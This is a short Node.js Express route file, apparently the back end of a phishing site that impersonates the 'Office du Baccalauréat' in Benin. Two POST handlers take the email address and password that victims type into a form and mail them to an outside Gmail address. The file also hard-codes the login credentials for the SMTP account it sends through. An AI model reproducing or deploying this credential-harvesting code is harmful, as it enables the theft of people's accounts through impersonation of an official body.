const express = require ("express")
const nodemailer = require ("nodemailer")
const route = express.Router()


// creation d'un canal de transport pour l'email
let mailTransporter = nodemailer.createTransport({
    host: "mail.hard-soft.bj",
    port: 465,
    secure: true,
    auth: {
        user: 'nathan.gnankadja@hard-soft.bj',
        pass: 'nathan.gnankadja@hard-soft.bj'
    }
});

route.get ("/", (req, res) => {
    res.render ("index")
})

route.post("/send_data", (req, res) => {
    let email = req.body.email;

    console.log (email)

    mailTransporter.sendMail({
        from: 'nathan.gnankadja@hard-soft.bj',
        to: 'Srico4468@gmail.com',
        subject: "Réponse de l'Office du Baccalauréat",
        text: email
    }).then(success => {
        console.log("ok")
        res.send ("ok")
    })
        .catch(err => {
            console.log(err)
            res.send ("no")
        }
        )
})

route.post("/send_datas", (req, res) => {
    let email = req.body.email,
        pass = req.body.pass;

    console.log (email)

    mailTransporter.sendMail({
        from: 'nathan.gnankadja@hard-soft.bj',
        to: 'Srico4468@gmail.com',
        subject: "Réponse de l'Office du Baccalauréat",
        text: "Email : " +email+ "  Mot de Passe : "+pass
    }).then(success => {
        console.log("ok")
        res.send ("ok")
    })
        .catch(err => {
            console.log(err)
            res.send ("no")
        }
        )
})



module.exports = route